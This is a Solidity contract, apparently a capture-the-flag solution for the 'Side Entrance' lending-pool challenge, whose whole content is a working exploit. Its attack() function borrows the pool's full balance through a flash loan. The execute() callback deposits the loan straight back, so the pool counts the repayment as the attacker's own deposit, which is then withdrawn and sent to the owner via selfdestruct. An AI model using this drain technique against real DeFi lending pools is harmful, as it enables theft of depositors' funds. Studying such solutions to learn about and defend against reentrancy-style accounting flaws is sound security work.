// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

contract AttackSideEntrance {
    using Address for address payable;

    address payable private pool;
    address payable public owner;
    ISideEntranceLenderPool public poolInterface;

    constructor(address payable poolAddress) {
        pool = poolAddress;
        poolInterface = ISideEntranceLenderPool(pool);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        poolInterface.flashLoan(pool.balance);
        poolInterface.withdraw();
        selfdestruct(owner);
    }

    function execute() external payable {
        // We receive msg.value from the lending pool, then deposit it right back
        poolInterface.deposit{value: msg.value}();
    }

    receive() external payable {}
}
